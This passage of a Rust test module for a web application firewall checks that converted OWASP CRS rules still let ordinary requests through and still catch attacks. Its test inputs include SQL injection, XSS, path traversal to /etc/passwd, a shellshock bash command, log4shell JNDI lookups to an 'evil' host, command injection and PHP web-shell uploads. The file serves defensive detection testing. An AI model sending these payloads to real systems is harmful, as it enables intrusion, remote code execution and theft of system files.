            ),
            (
                "Ruby error text in a log payload",
                probe(
                    "POST",
                    "/api/log",
                    "",
                    &[],
                    "log=undefined method `foo' for nil:NilClass",
                    1,
                ),
            ),
            (
                "legitimate multipart file upload",
                probe(
                    "POST",
                    "/upload",
                    "",
                    &[(
                        "content-type",
                        "multipart/form-data; boundary=----WebKitFormBoundaryABC",
                    )],
                    MULTIPART_UPLOAD,
                    1,
                ),
            ),
            // CRS-932180 tests uploaded file names against restricted-upload.data,
            // which lists `.env`; the raw body is not a file name.
            (
                "documentation mentioning .env keys",
                probe(
                    "POST",
                    "/api/docs",
                    "",
                    &[("content-type", "text/plain")],
                    "Set APP_KEY= and DB_PASSWORD= in your .env before booting",
                    1,
                ),
            ),
            (
                "JSON API request",
                probe(
                    "POST",
                    "/api/v2/orders",
                    "",
                    &[
                        ("content-type", "application/json"),
                        ("authorization", "Bearer eyJhbGciOiJIUzI1NiJ9.e30.sig"),
                    ],
                    "{\"items\":[{\"sku\":\"AB-12\",\"qty\":2}],\"note\":\"leave at door\"}",
                    1,
                ),
            ),
            // CRS-921230 counts `Range` headers; as a value test it never fired,
            // but the count is not expressible either way.
            (
                "byte-range media request",
                probe("GET", "/media/clip.mp4", "", &[("range", "bytes=1024-2047")], "", 3),
            ),
            // CRS-942130 without its chained `TX:1 @streq %{TX.2}` reduces to
            // "block any `word = word`".
            (
                "template placeholder in a body",
                probe("POST", "/api/render", "", &[], "tpl=hello #{name}", 2),
            ),
            (
                "ordinary key/value query string",
                probe("GET", "/search", "sort=price&view=grid", &[], "", 2),
            ),
        ];

        for (label, ctx) in &cases {
            assert!(
                checker.check(ctx).is_none(),
                "{label} must not be blocked, got {:?}",
                checker.check(ctx).and_then(|d| d.rule_id)
            );
        }
    }

    /// The narrowed fields must not cost detection: each payload is placed on a
    /// surface the upstream CRS rule genuinely reads.
    #[test]
    fn crs_conversion_still_detects_attacks_on_every_surface() {
        let checker = OWASPCheck::from_directory(&crs_dir());

        let cases: Vec<(&str, RequestCtx)> = vec![
            (
                "sqli in query string",
                probe("GET", "/list", "id=1' OR '1'='1", &[], "", 1),
            ),
            (
                "sqli in urlencoded POST body",
                probe(
                    "POST",
                    "/login",
                    "",
                    &[("content-type", "application/x-www-form-urlencoded")],
                    "user=admin%27+OR+1%3D1--+&pw=x",
                    1,
                ),
            ),
            (
                "sqli union in a JSON body",
                probe(
                    "POST",
                    "/api/q",
                    "",
                    &[("content-type", "application/json")],
                    "{\"q\":\"1 UNION SELECT password FROM users\"}",
                    1,
                ),
            ),
            (
                "xss in query string",
                probe("GET", "/s", "q=<script>alert(1)</script>", &[], "", 1),
            ),
            (
                "xss in a POST body",
                probe(
                    "POST",
                    "/comment",
                    "",
                    &[("content-type", "application/x-www-form-urlencoded")],
                    "text=%3Cscript%3Ealert%281%29%3C%2Fscript%3E",
                    1,
                ),
            ),
            (
                "xss in a cookie value",
                probe("GET", "/", "", &[("cookie", "theme=<script>alert(1)</script>")], "", 1),
            ),
            (
                "path traversal in query",
                probe("GET", "/download", "f=../../../../etc/passwd", &[], "", 1),
            ),
            (
                "path traversal in body",
                probe("POST", "/render", "", &[], "tpl=../../../../etc/passwd", 1),
            ),
            (
                "shellshock in User-Agent",
                probe(
                    "GET",
                    "/cgi-bin/x",
                    "",
                    &[("user-agent", "() { :;}; /bin/bash -c 'id'")],
                    "",
                    1,
                ),
            ),
            (
                "log4shell in a header",
                probe("GET", "/", "", &[("x-api-version", "${jndi:ldap://evil/a}")], "", 1),
            ),
            (
                "log4shell in a cookie",
                probe("GET", "/", "", &[("cookie", "sid=${jndi:ldap://evil/a}")], "", 1),
            ),
            (
                "rce in a POST body",
                probe("POST", "/run", "", &[], "cmd=;/bin/cat /etc/passwd", 1),
            ),
            (
                "php web shell uploaded through multipart",
                probe(
                    "POST",
                    "/upload",
                    "",
                    &[(
                        "content-type",
                        "multipart/form-data; boundary=----WebKitFormBoundaryABC",
                    )],
                    "------WebKitFormBoundaryABC\r\n\
Content-Disposition: form-data; name=\"file\"; filename=\"shell.php\"\r\n\r\n\
<?php system($_GET['c']); ?>\r\n\
------WebKitFormBoundaryABC--\r\n",
                    1,
                ),
            ),
            (
                "scanner user-agent",
                probe("GET", "/", "", &[("user-agent", "Nikto/2.1.6")], "", 1),
            ),
            (
                "unix shell payload in Referer",
                probe("GET", "/", "", &[("referer", "http://x/?a=;cat /etc/passwd")], "", 2),
            ),
            (
                "os file name in Referer",
                probe("GET", "/", "", &[("referer", "/etc/shadow")], "", 2),
            ),
        ];

        for (label, ctx) in &cases {
            let hit = checker.check(ctx);
            assert!(hit.is_some(), "{label} must still be detected");
        }
    }

    /// `rules/modsecurity/response-checks.yaml` describes response bodies.  It
    /// is not on the load path today, but if it ever is, none of it may run
    /// against a request: MODSEC-RESP-006 alone would block every form POST
    /// carrying an `api_key=` parameter.
    #[test]
    fn shipped_response_checks_are_inert_and_response_phase() {
        let path = Path::new(env!("CARGO_MANIFEST_DIR")).join("../../rules/modsecurity/response-checks.yaml");
        let checker = OWASPCheck::from_file_or_default(&path);
        let summary = checker.load_summary();

        assert_eq!(summary.attempted, 12, "declared response-phase rules");
        assert_eq!(
            summary.compiled, 0,
            "no response-phase rule may be enforced on a request"
        );
        assert!(
            summary
                .rejected
                .iter()
                .all(|r| matches!(&r.reason, RejectReason::UnsupportedField(f) if f == "response_body")),
            "every rejection must name the response field"
        );

        for (label, ctx) in [
            (
                "form POST carrying an api key",
                probe(
                    "POST",
                    "/settings",
                    "",
                    &[("content-type", "application/x-www-form-urlencoded")],
                    "api_key=abc123&app_key=def456",
                    1,
                ),
            ),
            (
                "git config pasted into a note",
                probe(
                    "POST",
                    "/api/notes",
                    "",
                    &[],
                    "[core]\n\trepositoryformatversion = 0\n",
                    1,
                ),
            ),
            (
                "python traceback in a bug report",
                probe(
                    "POST",
                    "/api/bugs",
                    "",
                    &[],
                    "Traceback (most recent call last):\n  File \"app.py\", line 3",
                    2,
                ),
            ),
        ] {
            assert!(checker.check(&ctx).is_none(), "{label} must not be blocked");
        }
    }

    // ── Surface fields ────────────────────────────────────────────────────────

    #[test]
    fn surface_lists_parse_in_any_order_and_reject_junk() {
        assert_eq!(Field::parse("all"), Some(Field::Multi(Surfaces::ALL)));
        assert_eq!(Field::parse("query+body"), Field::parse("body+query"));
        assert_eq!(
            Field::parse("path+query+body+cookies+headers"),
            Some(Field::Multi(Surfaces::ALL)),
            "the full surface list is exactly `all`"
        );
        // A repeated or unknown surface is a typo, not a narrower rule.
        assert_eq!(Field::parse("query+query"), None);
        assert_eq!(Field::parse("query+banana"), None);
        assert_eq!(Field::parse("query+"), None);
        // A sentinel field is never accepted, whatever variable it names.
        for sentinel in [
            "unmapped_files",
            "unmapped_multipart_part_headers",
            "unmapped_count_request_headers_range",
            "unmapped_chained_capture_equality",
        ] {
            assert_eq!(Field::parse(sentinel), None, "{sentinel} must stay unevaluable");
        }
    }

    #[test]
    fn a_surface_list_scans_only_the_surfaces_it_names() {
        let checker = OWASPCheck::from_yaml(&single_rule_yaml("query+cookies", "contains", "'needle'"));
        assert_eq!(checker.rule_count(), 1);

        assert!(
            checker.check(&probe("GET", "/", "a=needle", &[], "", 1)).is_some(),
            "query"
        );
        assert!(
            checker
                .check(&probe("GET", "/", "", &[("cookie", "x=needle")], "", 1))
                .is_some(),
            "cookies"
        );
        // Surfaces the field does not name must be left alone.
        assert!(
            checker.check(&probe("GET", "/needle", "", &[], "", 1)).is_none(),
            "path"
        );
        assert!(
            checker.check(&probe("POST", "/", "", &[], "needle", 1)).is_none(),
            "body"
        );
        assert!(
            checker
                .check(&probe("GET", "/", "", &[("x-thing", "needle")], "", 1))
                .is_none(),
            "header value"
        );
    }

    #[test]
    fn user_agent_and_referer_surfaces_do_not_leak_into_other_headers() {
        let checker = OWASPCheck::from_yaml(&single_rule_yaml("user_agent+referer", "contains", "'needle'"));
        assert_eq!(checker.rule_count(), 1);

        for header in ["user-agent", "referer"] {
            assert!(
                checker
                    .check(&probe("GET", "/", "", &[(header, "needle")], "", 1))
                    .is_some(),
                "{header} must be scanned"
            );
        }
        for header in ["accept", "x-forwarded-for", "cookie"] {
            assert!(
                checker
                    .check(&probe("GET", "/", "", &[(header, "needle")], "", 1))
                    .is_none(),
                "{header} must not be scanned"
            );
        }
    }

    /// Regression guard for the response-phase mislabelling: these bodies are
    /// ordinary application traffic (bug reports, error-reporting payloads,
    /// CMS content) that the `response-*.yaml` rules used to block outright
    /// because they were tagged `field: body`.
    #[test]
    fn response_phase_patterns_do_not_block_ordinary_request_bodies() {
        let checker = OWASPCheck::from_directory(&crs_dir());

        // Paranoia 1 (the shipped default).
        for body in [
            // php-errors.data phrases — short strings that occur in prose.
            "note=we call SQLBindCol here",
            "report=Got chunk while reading",
            // asp-dotnet-errors.data phrase.
            "msg=Invalid XBM file",
            // web-shells-php.data phrase that is the name of legitimate
            // open-source software.
            "html=<title>Tiny File Manager</title>",
            // A stack trace POSTed to an error-reporting endpoint.
            "err=java.sql.SQLException: connection refused",
            // CRS-950140 `^#!\s?/` — any script or config upload.
            "#!/x",
        ] {
            assert!(
                checker.check(&make_ctx_with_body(body, 1)).is_none(),
                "PL1 must not block ordinary request body: {body}"
            );
        }

        // Paranoia 2 additionally enabled the Ruby and IIS leakage rules.
        for body in ["tpl=hello #{name}", "path=c:/inetpub/logs"] {
            assert!(
                checker.check(&make_ctx_with_body(body, 2)).is_none(),
                "PL2 must not block ordinary request body: {body}"
            );
        }

        // CRS-950100 tests RESPONSE_STATUS `^5\d{2}$`; while it carried
        // `field: all` it matched the request's own `Content-Length` header,
        // so every PL2 request with a 500..599-byte body was blocked.
        let mut ctx = make_ctx_with_body("hello", 2);
        ctx.headers.insert("content-length".into(), "512".into());
        assert!(
            checker.check(&ctx).is_none(),
            "a 512-byte request body is not a 5xx response status"
        );
    }

    /// Disabling the response-phase web-shell rules must not lose request-phase
    /// web-shell *upload* detection: the CRS 933 PHP-injection rules already
    /// cover it, and they run against the request body.
    #[test]
    fn php_webshell_upload_is_still_detected_in_the_request_phase() {
        let checker = OWASPCheck::from_directory(&crs_dir());

        for body in [
            "<?php\n$auth_pass=\"\";\necho \"<title>r57 shell</title>\";\n@eval($_POST['cmd']);\n",
            "<?php system($_GET['c']); ?>",
        ] {
            let hit = checker
                .check(&make_ctx_with_body(body, 1))
                .unwrap_or_else(|| panic!("web-shell upload must still be detected: {body}"));
            let id = hit.rule_id.unwrap_or_default();
            assert!(
                !id.starts_with("CRS-RESP-"),
                "detection must come from a request-phase rule, got {id}"
            );
        }
    }

    /// A representative `pm_from_file` rule from the shipped set actually fires.
    #[test]
    fn shipped_crs_scanner_wordlist_rule_fires() {
        let checker = OWASPCheck::from_directory(&crs_dir());
        // CRS-913100 — scanners-user-agents.data on the User-Agent header.
        let ctx = make_ctx_with_header("user-agent", "sqlmap/1.7#stable (http://sqlmap.org)");
        let hit = checker.check(&ctx);
        assert!(
            hit.is_some(),
            "a known scanner UA must be detected by the shipped rules"
        );
    }
    // ── Chained rules (ModSecurity `chain`) ──────────────────────────────────

    /// Evaluate one shipped rule by id, ignoring the paranoia gate.
    ///
    /// The point of these tests is the rule's own semantics; whether the host
    /// runs at PL1 or PL2 is a separate policy question, and several of the
    /// chained rules are PL2.
    fn fires(checker: &OWASPCheck, id: &str, ctx: &RequestCtx) -> bool {
        checker
            .rules
            .iter()
            .find(|r| r.id == id)
            .unwrap_or_else(|| panic!("{id} must be an enforced rule"))
            .matches(ctx)
    }

    /// Ordinary traffic that every chained rule used to block, because only
    /// the rule's *first* condition survived the conversion.
    ///
    /// Each entry names the rule that blocked it and the condition that was
    /// missing.  These are the regressions the `chain:` schema exists to fix.
    #[test]
    fn chained_rules_do_not_block_ordinary_traffic() {
        let checker = OWASPCheck::from_directory(&crs_dir());

        let cases: Vec<(&str, RequestCtx)> = vec![
            // CRS-944110's first condition is `@rx (?:runtime|processbuilder)`.
            // Alone it blocked every request that so much as mentions the word;
            // the chained condition requires the *same* value to also contain
            // `unmarshaller|base64data|java.`.
            (
                "944110: java runtime mentioned in a log payload",
                probe(
                    "POST",
                    "/api/logs",
                    "",
                    &[("content-type", "application/json")],
                    "{\"msg\":\"java runtime version 17.0.9 started\"}",
                    1,
                ),
            ),
            (
                "944110: 'runtime' as a documentation query",
                probe("GET", "/docs", "topic=runtime", &[], "", 1),
            ),
            (
                "944110: ProcessBuilder named in a trace header",
                probe("GET", "/", "", &[("x-trace", "processbuilder")], "", 1),
            ),
            // CRS-944120 is the same shape with the gadget list first.
            (
                "944120: gadget class name in prose without a spawn call",
                probe("POST", "/api/notes", "", &[], "note=InvokerTransformer explained", 1),
            ),
            // CRS-932205/6/7 first conditions match *any* Referer
            // (`^[^#]+`, `#.*`), so a plain product link was a 403.
            (
                "932205/932206: ordinary Referer",
                probe(
                    "GET",
                    "/p",
                    "",
                    &[("referer", "https://shop.example.com/products?page=2")],
                    "",
                    2,
                ),
            ),
            (
                "932207: Referer carrying a fragment",
                probe(
                    "GET",
                    "/p",
                    "",
                    &[("referer", "https://shop.example.com/docs#section-2")],
                    "",
                    2,
                ),
            ),
            (
                "932207: scroll-to-text fragment",
                probe(
                    "GET",
                    "/p",
                    "",
                    &[("referer", "https://shop.example.com/docs#:~:text=hello")],
                    "",
                    2,
                ),
            ),
            // CRS-920200 exempts PDF viewers, which legitimately ask for many
            // ranges; without the chained condition every one was blocked.
            (
                "920200: multi-range PDF fetch",
                probe(
                    "GET",
                    "/docs/manual.pdf",
                    "",
                    &[("range", "bytes=0-1,1-2,2-3,3-4,4-5,5-6,6-7")],
                    "",
                    2,
                ),
            ),
            // CRS-933150 matches PHP function *names*; the chained condition
            // requires a parenthesis, i.e. an actual call.
            (
                "933150: PHP function name in prose",
                probe(
                    "POST",
                    "/api/notes",
                    "",
                    &[],
                    "note=we replaced array_map with a loop",
                    1,
                ),
            ),
            // CRS-932200's first condition matches a quote followed by a path;
            // the chain requires the same value to hold a slash *and*
            // whitespace, i.e. a command line.
            (
                "932200: relative redirect target in a query argument",
                probe("GET", "/login", "next=/account/settings?tab=billing", &[], "", 2),
            ),
            // CRS-943110/943120 only mean "session id in the URL *and* an
            // off-domain / absent Referer".
            (
                "943110: session id parameter with a same-origin Referer",
                probe(
                    "GET",
                    "/x",
                    "phpsessid",
                    &[("referer", "https://example.com/a"), ("host", "example.com")],
                    "",
                    1,
                ),
            ),
            (
                "943120: session id parameter with a Referer present",
                probe(
                    "GET",
                    "/x",
                    "phpsessid",
                    &[("referer", "https://example.com/a"), ("host", "example.com")],
                    "",
                    1,
                ),
            ),
            // CRS-931130 is refused outright (its chain reads a `setvar`
            // collection): its first condition alone blocked every OAuth
            // redirect and every absolute URL in a query argument.
            (
                "931130: absolute URL in an OAuth redirect parameter",
                probe(
                    "GET",
                    "/oauth/authorize",
                    "redirect_uri=https://app.example.com/cb&state=xyz",
                    &[("host", "example.com")],
                    "",
                    2,
                ),
            ),
            // CRS-942130 is refused outright (see the converter's
            // `args_self_equality` note): its capture-equality test reads the
            // query string's own `name=value` separator as a tautology.
            (
                "942130: a parameter whose value equals its name",
                probe("GET", "/s", "tab=tab", &[], "", 2),
            ),
        ];

        for (label, ctx) in &cases {
            assert!(
                checker.check(ctx).is_none(),
                "{label} must not be blocked, got {:?}",
                checker.check(ctx).and_then(|d| d.rule_id)
            );
        }
    }

    /// What each chained rule is actually for must still be caught — by that
    /// very rule, not incidentally by a neighbour.
    #[test]
    fn chained_rules_still_detect_their_attacks() {
        let checker = OWASPCheck::from_directory(&crs_dir());

        let cases: Vec<(&str, RequestCtx)> = vec![
            (
                "CRS-944110",
                probe(
                    "POST",
                    "/struts",
                    "",
                    &[("content-type", "application/xml")],
                    "<map><jdk.nashorn.internal.objects.NativeString><value \
                     class=\"com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data\">",
                    1,
                ),
            ),
            // Lower-case on purpose: upstream CRS applies `t:lowercase` to
            // this rule and this engine implements no transformation pipeline,
            // so `InvokerTransformer` as written in a Java class name is not
            // matched.  That gap predates chaining and is tracked separately.
            (
                "CRS-944120",
                probe(
                    "POST",
                    "/api",
                    "",
                    &[("content-type", "application/xml")],
                    "org.apache.commons.collections.functors.invokertransformer runtime",
                    1,
                ),
            ),
            (
                "CRS-932206",
                probe("GET", "/", "", &[("referer", "x';id /tmp'")], "", 2),
            ),
            (
                "CRS-920200",
                probe(
                    "GET",
                    "/img/tile.png",
                    "",
                    &[("range", "bytes=0-1,1-2,2-3,3-4,4-5,5-6,6-7")],
                    "",
                    2,
                ),
            ),
            (
                "CRS-933150",
                probe("POST", "/api/notes", "", &[], "note=array_map('system',$_GET)", 1),
            ),
            (
                "CRS-932200",
                probe("POST", "/run", "", &[], "cmd='/bin/cat /etc/passwd'", 2),
            ),
            ("CRS-942131", probe("GET", "/s", "id=1 or 3>2", &[], "", 2)),
            ("CRS-942521", probe("GET", "/s", "u=admin' or 1", &[], "", 2)),
            (
                "CRS-943110",
                probe(
                    "GET",
                    "/x",
                    "phpsessid",
                    &[("referer", "https://evil.test/a"), ("host", "example.com")],
                    "",
                    1,
                ),
            ),
            (
                "CRS-943120",
                probe("GET", "/x", "phpsessid", &[("host", "example.com")], "", 1),
            ),
        ];

        for (id, ctx) in &cases {
            assert!(fires(&checker, id, ctx), "{id} must still fire on its own attack");
            assert!(checker.check(ctx).is_some(), "{id}'s attack must be blocked");
        }
    }

    /// A chain stops at the first condition that fails, and the whole rule is
    /// silent unless every condition holds.
    #[test]
    fn chain_requires_every_condition() {
        let yaml = r#"
version: "1.0"
rules:
  - id: TEST-CHAIN
    name: chained rule
    category: test
    severity: critical
    paranoia: 1
    field: query
    operator: contains
    value: alpha
    chain:
      - field: query
        operator: contains
        value: beta
      - field: header_referer
        operator: contains
        value: gamma
    action: block
"#;
        let checker = OWASPCheck::from_yaml(yaml);
        assert_eq!(checker.rule_count(), 1);

        let all = probe("GET", "/", "alpha+beta", &[("referer", "gamma")], "", 1);
        assert!(checker.check(&all).is_some(), "every condition holds");

        for (label, ctx) in [
            ("head fails", probe("GET", "/", "beta", &[("referer", "gamma")], "", 1)),
            (
                "link 0 fails",
                probe("GET", "/", "alpha", &[("referer", "gamma")], "", 1),
            ),
            ("link 1 fails", probe("GET", "/", "alpha+beta", &[], "", 1)),
        ] {
            assert!(checker.check(&ctx).is_none(), "{label}: chain must not fire");
        }
    }

    /// `matched_value` is the value the previous condition matched, not the
    /// whole request: a second condition satisfied by a *different* surface
    /// must not complete the chain.
    #[test]
    fn matched_value_is_scoped_to_the_value_that_matched() {
        let yaml = r#"
version: "1.0"
rules:
  - id: TEST-MATCHED
    name: matched value chain
    category: test
    severity: critical
    paranoia: 1
    field: query+body
    operator: contains
    value: runtime
    chain:
      - field: matched_value
        operator: contains
        value: java
    action: block
"#;
        let checker = OWASPCheck::from_yaml(yaml);
        assert_eq!(checker.rule_count(), 1);

        let same = probe("POST", "/", "", &[], "java.runtime.exec", 1);
        assert!(checker.check(&same).is_some(), "one value satisfies both conditions");

        // `runtime` in the query, `java` in the body: two different values, so
        // the chain must stay silent.  A naive "re-scan the whole request"
        // implementation would fire here.
        let split = probe("POST", "/", "topic=runtime", &[], "a java tutorial", 1);
        assert!(checker.check(&split).is_none(), "different values must not combine");
    }

    /// `matched_value` carries the *decoded* form when the match was made on
    /// one, mirroring `ModSecurity` `MATCHED_VARS` holding the transformed
    /// value.
    #[test]
    fn matched_value_carries_the_decoded_form() {
        let yaml = r#"
version: "1.0"
rules:
  - id: TEST-DECODED
    name: decoded matched value
    category: test
    severity: critical
    paranoia: 1
    field: query
    operator: contains_any
    value: 'system'
    chain:
      - field: matched_value
        operator: contains
        value: '('
    action: block
"#;
        let checker = OWASPCheck::from_yaml(yaml);
        let ctx = probe("GET", "/", "cmd=%73ystem%28id%29", &[], "", 1);
        assert!(
            checker.check(&ctx).is_some(),
            "the chain must see the urlDecoded text the phrase matched"
        );
    }

    /// `tx:N` reads the capture groups of the last capturing condition, and
    /// `%{TX.N}` expands one on the right-hand side.
    #[test]
    fn captures_are_bound_and_comparable() {
        let yaml = r#"
version: "1.0"
rules:
  - id: TEST-CAPTURE
    name: capture equality
    category: test
    severity: critical
    paranoia: 1
    field: query
    operator: regex
    value: '([a-z]+)=([a-z]+)'
    capture: true
    chain:
      - field: tx:1
        operator: equals
        value: '%{TX.2}'
    action: block
"#;
        let checker = OWASPCheck::from_yaml(yaml);
        assert_eq!(checker.rule_count(), 1);
        assert!(
            checker.check(&probe("GET", "/", "same=same", &[], "", 1)).is_some(),
            "identical captures must fire"
        );
        assert!(
            checker.check(&probe("GET", "/", "left=right", &[], "", 1)).is_none(),
            "different captures must not fire"
        );
    }

    /// `%{REQUEST_HEADERS.HOST}` expands to the request's `Host` header, and a
    /// request without one must not satisfy the *negated* comparison — the
    /// failure mode that would block every `Host`-less request.
    #[test]
    fn host_macro_expands_and_an_absent_host_never_matches() {
        let yaml = r#"
version: "1.0"
rules:
  - id: TEST-HOST
    name: off-domain referer
    category: test
    severity: critical
    paranoia: 1
    field: header_referer
    operator: regex
    value: '^https?://([^/]*)/'
    capture: true
    chain:
      - field: tx:1
        operator: ends_with
        value: '%{request_headers.host}'
        negate: true
    action: block
"#;
        let checker = OWASPCheck::from_yaml(yaml);
        assert_eq!(checker.rule_count(), 1);

        let off_domain = probe(
            "GET",
            "/",
            "",
            &[("referer", "https://evil.test/a"), ("host", "example.com")],
            "",
            1,
        );
        assert!(checker.check(&off_domain).is_some(), "off-domain referer fires");

        let same_domain = probe(
            "GET",
            "/",
            "",
            &[("referer", "https://example.com/a"), ("host", "example.com")],
            "",
            1,
        );
        assert!(checker.check(&same_domain).is_none(), "same-origin referer is fine");

        let no_host = probe("GET", "/", "", &[("referer", "https://example.com/a")], "", 1);
        assert!(
            checker.check(&no_host).is_none(),
            "an unexpandable macro must not satisfy a negated condition"
        );
    }

    /// `count_header_<name>` is a presence test, and only `0`/`1` targets are
    /// accepted — anything else could never be reached.
    #[test]
    fn header_count_is_presence_only() {
        let yaml = |value: &str| {
            format!(
                "version: \"1.0\"\nrules:\n  - id: TEST-COUNT\n    name: t\n    category: test\n    \
                 severity: critical\n    paranoia: 1\n    field: count_header_referer\n    \
                 operator: equals\n    value: '{value}'\n    action: block\n"
            )
        };
        let checker = OWASPCheck::from_yaml(&yaml("0"));
        assert_eq!(checker.rule_count(), 1);
        assert!(checker.check(&probe("GET", "/", "", &[], "", 1)).is_some(), "absent");
        assert!(
            checker
                .check(&probe("GET", "/", "", &[("referer", "http://x/")], "", 1))
                .is_none(),
            "present"
        );

        let unreachable = OWASPCheck::from_yaml(&yaml("2"));
        assert_eq!(unreachable.rule_count(), 0, "a count of 2 is not reachable");
        assert_eq!(unreachable.load_summary().count(RejectCategory::InvalidValue), 1);

        // Only headers the engine can read may be counted.
        let unknown = OWASPCheck::from_yaml(&single_rule_yaml("count_header_accept", "equals", "'0'"));
        assert_eq!(unknown.rule_count(), 0);
        assert_eq!(unknown.load_summary().rejected_field_count(), 1);
    }

    /// A chain condition the engine cannot compile drops the whole rule and
    /// says which link failed — it never degrades to "run what compiled".
    #[test]
    fn unusable_chain_condition_rejects_the_whole_rule() {
        let rule = |link: &str| {
            format!(
                "version: \"1.0\"\nrules:\n  - id: TEST-BAD-CHAIN\n    name: t\n    category: test\n    \
                 severity: critical\n    paranoia: 1\n    field: query\n    operator: contains\n    \
                 value: alpha\n    chain:\n{link}    action: block\n"
            )
        };

        // Unsupported field in a link.
        let bad_field = OWASPCheck::from_yaml(&rule(
            "      - field: response_body\n        operator: contains\n        value: x\n",
        ));
        assert_eq!(bad_field.rule_count(), 0);
        assert_eq!(bad_field.load_summary().count(RejectCategory::Chain), 1);

        // Unsupported operator in a link.
        let bad_op = OWASPCheck::from_yaml(&rule(
            "      - field: query\n        operator: verify_cc\n        value: x\n",
        ));
        assert_eq!(bad_op.rule_count(), 0);
        assert_eq!(bad_op.load_summary().count(RejectCategory::Chain), 1);
        assert_eq!(
            bad_op.load_summary().rejected_operator_count(),
            0,
            "a chain failure is reported as a chain failure"
        );

        // `tx:1` with nothing capturing before it can never match.
        let unbound = OWASPCheck::from_yaml(&rule(
            "      - field: tx:1\n        operator: contains\n        value: x\n",
        ));
        assert_eq!(unbound.rule_count(), 0);
        assert!(matches!(
            unbound.load_summary().rejected.first().map(|r| &r.reason),
            Some(RejectReason::UnresolvedCapture { index: 1, .. })
        ));

        // `%{TX.3}` with nothing capturing before it, likewise.
        let unbound_macro = OWASPCheck::from_yaml(&rule(
            "      - field: query\n        operator: equals\n        value: '%{TX.3}'\n",
        ));
        assert_eq!(unbound_macro.rule_count(), 0);
        assert_eq!(unbound_macro.load_summary().count(RejectCategory::Chain), 1);

        // `capture` on a non-regex operator promises bindings it cannot make.
        let bad_capture = OWASPCheck::from_yaml(
            "version: \"1.0\"\nrules:\n  - id: TEST-BAD-CAPTURE\n    name: t\n    category: test\n    \
             severity: critical\n    paranoia: 1\n    field: query\n    operator: contains\n    \
             value: alpha\n    capture: true\n    action: block\n",
        );
        assert_eq!(bad_capture.rule_count(), 0);
        assert!(matches!(
            bad_capture.load_summary().rejected.first().map(|r| &r.reason),
            Some(RejectReason::CaptureWithoutRegex { .. })
        ));

        // An unexpandable macro is rejected rather than compared literally.
        let bad_macro = OWASPCheck::from_yaml(&single_rule_yaml("query", "equals", "'%{tx.crs_setup_version}'"));
        assert_eq!(bad_macro.rule_count(), 0);
        assert_eq!(bad_macro.load_summary().count(RejectCategory::InvalidValue), 1);
    }

    /// The head pseudo-fields are chain-only: a rule whose *head* reads
    /// `matched_value` or `tx:N` has nothing to read from.
    #[test]
    fn chain_pseudo_fields_are_not_valid_as_a_head() {
        for field in ["matched_value", "tx:0"] {
            let checker = OWASPCheck::from_yaml(&single_rule_yaml(field, "contains", "x"));
            assert_eq!(checker.rule_count(), 0, "{field} must not be a head field");
            assert_eq!(checker.load_summary().rejected_field_count(), 1);
        }
    }

    /// `negate` is per-value: the condition holds when *some* value fails the
    /// matcher, which is what `ModSecurity` `!@op` means on a collection.
    #[test]
    fn negate_holds_when_a_value_fails_the_matcher() {
        let checker = OWASPCheck::from_yaml(
            "version: \"1.0\"\nrules:\n  - id: TEST-NEG\n    name: t\n    category: test\n    \
             severity: critical\n    paranoia: 1\n    field: path\n    operator: ends_with\n    \
             value: .pdf\n    negate: true\n    action: block\n",
        );
        assert_eq!(checker.rule_count(), 1);
        assert!(checker.check(&make_ctx("GET", "/a/b.png", 0)).is_some());
        assert!(checker.check(&make_ctx("GET", "/a/b.pdf", 0)).is_none());
    }

    // ── Surface-scoped percent-decoding ──────────────────────────────────────
    //
    // ModSecurity hands CRS an already-decoded `ARGS` / `REQUEST_COOKIES` /
    // `REQUEST_FILENAME`, so every pattern operator has to see the decoded
    // forms of those surfaces or the whole rule set is bypassed by sending the
    // payload percent-encoded.  `REQUEST_HEADERS` is the exception upstream
    // leaves raw, and these tests pin both halves of that split.

    /// One end-to-end request shape, benign or hostile.
    struct Probe {
        label: &'static str,
        method: &'static str,
        path: &'static str,
        query: &'static str,
        body: &'static str,
        headers: &'static [(&'static str, &'static str)],
    }

    const BROWSER: &[(&str, &str)] = &[
        (
            "user-agent",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0 Safari/537.36",
        ),
        (
            "accept",
            "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        ),
        ("accept-language", "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7"),
        ("accept-encoding", "gzip, deflate, br"),
        ("host", "shop.example.com"),
    ];

    const FORM_POST: &[(&str, &str)] = &[
        ("content-type", "application/x-www-form-urlencoded"),
        ("user-agent", "Mozilla/5.0 (X11; Linux x86_64) Chrome/126.0"),
        ("host", "shop.example.com"),
    ];

    fn probe_ctx(p: &Probe, paranoia: u8) -> RequestCtx {
        let mut ctx = make_ctx(p.method, p.path, p.body.len() as u64);
        ctx.query = p.query.into();
        ctx.body_preview = Bytes::copy_from_slice(p.body.as_bytes());
        for (name, value) in p.headers {
            ctx.headers.insert((*name).to_owned(), (*value).to_owned());
        }
        let dc = DefenseConfig {
            owasp_set: true,
            owasp_paranoia: paranoia,
            ..DefenseConfig::default()
        };
        ctx.host_config = Arc::new(HostConfig {
            code: "test".into(),
            host: "shop.example.com".into(),
            defense_config: dc,
            ..HostConfig::default()
        });
        ctx
    }

    /// The rule id `checker` blocks `p` with, or `None`.
    fn verdict(checker: &OWASPCheck, p: &Probe, paranoia: u8) -> Option<String> {
        checker.check(&probe_ctx(p, paranoia)).and_then(|d| d.rule_id)
    }

    /// Ordinary traffic, every shape that carries a `%` or a `+` for entirely
    /// innocent reasons.
    fn benign_probes() -> &'static [Probe] {
        const JSON_POST: &[(&str, &str)] = &[
            ("content-type", "application/json"),
            ("user-agent", "Mozilla/5.0 (X11; Linux x86_64) Chrome/126.0"),
            ("host", "shop.example.com"),
        ];
        const REFERER_AND_COOKIE: &[(&str, &str)] = &[
            ("user-agent", "Mozilla/5.0 (X11; Linux x86_64) Chrome/126.0"),
            (
                "referer",
                "https://www.google.com/search?q=%E4%B8%AD%E6%96%87+%E5%95%86%E5%93%81&oq=a%2Bb",
            ),
            (
                "cookie",
                "sid=8f3a%2Fb1d%3D%3D; lang=zh%2DCN; cart=%7B%22id%22%3A12%7D; _ga=GA1.2.1.1",
            ),
            ("host", "shop.example.com"),
        ];
        const MULTIPART: &[(&str, &str)] = &[
            (
                "content-type",
                "multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW",
            ),
            ("user-agent", "Mozilla/5.0 (X11; Linux x86_64) Chrome/126.0"),
